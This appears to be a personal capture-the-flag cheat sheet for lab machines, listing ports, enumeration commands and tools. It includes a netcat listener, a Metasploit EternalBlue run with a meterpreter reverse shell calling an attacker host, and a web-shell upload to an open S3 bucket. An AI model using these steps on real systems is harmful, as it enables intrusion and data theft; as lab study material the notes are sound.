
# Ports

|   #   | Type | Name     | Notes         | Exploits      |
| ----- | ---- | -------- | ------------- | ------------- |
| 21    | TCP  | FTP      | vsftpd 3.0.3  | Anonymous login |
| 22    | TCP  | ssh      | | |
| 23    | TCP  | telnet   | Linux telnetd | Guess root login |
| 80    | TCP  | http     | See table below  | Many |
| 135   | TCP  | msrpc    | MS Remote Procedure Call | |
| 443   | TCP  | https    | 
| 445   | TCP  | SMB      | Server Message Block, microsoft-ds? | smbclient, misconfig'd user, metasploit |
| 873   | TCP  | rsync    | (protocol version 31) | misconfig'd anonymous |
| 27017 | TCP  | mongodb  | MongoDB 3.6.8 | mongosh |
| 3306  | TCP  | mysql?   | |
| 3389  | TCP  | ms-wbt-server | Microsoft Terminal Services | xfreerdp |
| 6379  | TCP  | redis    | Redis key-value store 5.0.7 | 

A useful tool for understanding more about each port is the speedguide website.
`https://www.speedguide.net/port.php?port={port}`

## Port 80 frameworks

| Framework | Version | Tools/exploits |
| --------- | ------- | -------------- |
| nginx | 1.14.2 | gobuster |
| freepbx | 16.0.40.7 | CVE-2025-57819 |
| s3 | <all> | aws cli |
<br>

# Useful BASH commands
## nmap Network Mapping
### Scan open ports for service and version info
`$ sudo nmap -sV -sC {target_ip}`

### Add tp /etc/hosts file
`echo "{target_ip} subdomain.domain.com" | sudo tee -a /etc/hosts`

### Find local machine's tun0 and IP
`ifconfig`

### Starting an NCAT listener
`nc -nvlp 1337`

### Starting a file server from the local directory you want to serve
`python3 -m http.server 8000`

<br>

# Third-party resources and tools
## [linPeas ](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
### Type: Escalation

## [nmap ](https://nmap.org/book/man.html)
### Type: Discovery

`$ sudo nmap -sV {target_ip}`

```bash
# Useful switches
-p- : This flag scans for all TCP ports ranging from 0-65535
-sV : Attempts to determine the version of the service running on a port
--min-rate : This is used to specify the minimum number of packets that Nmap should send 
per second; it speeds up the scan as the number goes higher
```

## [smbclient]()
### Type: Connector
#### List all clients
`$ smbclient -l {target_ip}`

#### Connect to a client
`$ smbclient \\\\{target_ip}\\{shareName}`

```bash
ls : listing contents of the directories within the share
cd : changing current directories within the share
get : downloading the contents of the directories within the share
exit : exiting the smb shell
```

## [redis-cli]()
### Type: Connector
#### Installing redis-cli command line tools
`$ sudo apt install redis-tools`

#### Connect to redis using hostname -h
`$ redis-cli -h {target_IP}`

#### Useful commands when connected
```bash
> info  # Get serve info
> select 0  # Select a database
> keys *  # List all available keys
> get <key>  # Retrieve the stored value for the specified key
```

## [xfreerdp](www.freerdp.com)
### Type: Remote Desktop Tool
#### Installing xfreerdp

```bash
# Install one of the following
sudo apt-get install freerdp2-x11
sudo apt-get install freerdp3-x11
```

```bash
# Useful switches
/cert:ignore : Specifies to the scrips that all security certificate usage should be 
ignored.
/u:Administrator : Specifies the login username to be "Administrator".
/v:{target_IP} : Specifies the target IP of the host we would like to connect to.
```

## [gobuster]()
### Type: FUZZ
#### Installing gobuster
```bash
# Install using package manager
$ sudo apt install gobuster
```

```bash
# Install by compiling source
$ sudo git clone https://github.com/OJ/gobuster.git
$ cd gobuster
$ go get && go build
$ go install
```

```bash
# Useful switches
dir : specify we are using the directory busting mode of the tool
-w : specify a wordlist, a collection of common directory names that are typically used 
for sites
-u : specify the target's IP address
-x {filetype} : look for specific file types
```

#### Populate a wordlist
`$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt -O /usr/share/wordlists/common.txt`


#### Running gobuster
`$ sudo gobuster dir -w /usr/share/wordlists/common.txt -u {target_IP}`


## [mongosh](https://www.mongodb.com/try/download/shell)
### Type: Mongo DB Shell
#### Installation

```bash
$ curl -O https://downloads.mongodb.com/compass/mongosh-2.3.2-linux-x64.tgz
$ tar xvf mongosh-2.3.2-linux-x64.tgz
$ cd mongosh-2.3.2-linux-x64/bin
```

#### Connecting to a Mongo DB
`$ ./mongosh mongodb://{target_IP}:27017`

#### Exploring the database

```bash
# List databases
$ show dbs;

# Select a database
$ use {database_name};
# eg. $ use sensitive_information;

# List collections within the database
$ show collections;

# Dump contents of collection
$ db.{collection_name}.find();
# eg. $ db.flag.find();
```

## [rsync](https://linux.die.net/man/1/rsync)
### Type: Connector/ File Transfer
#### Using rsync

```bash
# list available directories
$ rsync --list-only {target_IP}::

# list files within a share
$ rsync --list-only {target_IP}::{directory_name}
# eg. rsync --list-only {target_IP}::public

# transfer file to local machine
$ rsync {target_IP}::{remote_dir}/{filename} {local_filename}
# eg. rsync {target_IP}::public/flag.txt flag.txt
```

## [metasploit]()
### Type: Exploit search and deploy
#### Using metasploit

```bash
# Start metasploit console
$ msfconsole
```

In this example, we use a known vulnerability for SMB called `eternalblue`, which forces a command prompt session on the target system.

```bash
# Search msf for a specific exploit
[msf](Jobs:0 Agents:0) >> search eternalblue

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7
   ...

# Select the exploit and variation you want to use     
[msf](Jobs:0 Agents:0) >> use 2
[*] Additionally setting TARGET => Windows 7
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

# Set target
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set rhosts 10.129.53.118
rhosts => 10.129.53.118

# Set attacking machine
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set lhost 10.10.14.66
lhost => 10.10.14.66

# Set attacking machine port IMPORTANT FOR SUCCESS -> meterpreter
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set lport 4445
lport => 4445
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> show options
...
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set VERIFY_ARCH true
VERIFY_ARCH => true
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set VERIFY_TARGET true
VERIFY_TARGET => true

# Start the exploit attack
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> run
```

## [mysql]()
### Type: Connector
#### Install mysql command line tools
`sudo apt update && sudo apt install mysql*`

#### Connect to mysql server
`mysql -h {target_ip} -u {username}`

#### If getting SSL errors add
`--ssl-verify-server-cert=FALSE`

#### Useful commands when connected
```bash 
MariaDB [htb]> SHOW databases;

MariaDB [htb]> USE {database_name};

MariaDB [htb]> SHOW tables;

MariaDB [htb]> SELECT * FROM {table_name};
```

## AWS/S3
### Type: Connector
#### Indicator
If you come across additional subdomains or webpages that only load the following, you more than likely are dealing with an AWS S3 bucket for storage.
`{"status": "running"}`

#### Installing AWS cli tools
`apt install awscli`

Next is to try arbitrary config settings to gain access.

```bash
$ aws configure
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
```

If successful, we can use the following useful commands.

```bash
# list all available buckets
aws --endpoint=http://s3.thetoppers.htb s3 ls

# list all objects in a specific bucket
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb

# copy items from home directory to bucket
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

<br>

# Sources
| Name | Decription |
| ---- | ---------- |
| [danielmiessler](https://github.com/danielmiessler/SecLists) | Full SecLists collection |


# Checklist

- nmap
ftp anonymous
- website? what kind
- find additional pages (gobuster)
- find additional subdomains
/etc/hosts file for resolving domains